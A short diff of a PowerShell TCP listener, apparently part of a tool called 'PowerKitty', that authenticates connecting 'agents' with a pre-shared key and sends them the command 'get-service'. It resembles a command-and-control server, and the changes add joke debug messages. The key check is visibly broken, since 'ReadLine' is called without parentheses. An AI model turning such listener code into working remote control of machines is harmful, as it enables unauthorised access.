@@ -53,7 +53,7 @@ Function Global:New-Listerner()
 		if($client = $listener.AcceptTcpClient())
 		{
 			
-			
+			"sock!"
 
 			# add agent to listerner
 			#$thisListerner = Get-Listerner -UUID ($obj.UUID.toString())
@@ -79,11 +79,14 @@ Function Global:New-Listerner()
 				# if PSK matches, payload
 				if($StreamReader.ReadLine == $PSK)
 				{
+					"new agent <3"
 					$StreamWriter.WriteLine("get-service") | Out-Null
+
 				}
 				# else, gtfo
 				else
 				{
+					"bad woof woof detected"
 					$StreamWriter.WriteLine("PowerKitty: Hisss!!!") | Out-Null
 				}
 
@@ -93,7 +96,7 @@ Function Global:New-Listerner()
 			})
 
 			$AsyncObject = $PowerShell.BeginInvoke()
-			"sock!"
+			
 
 		}
 		
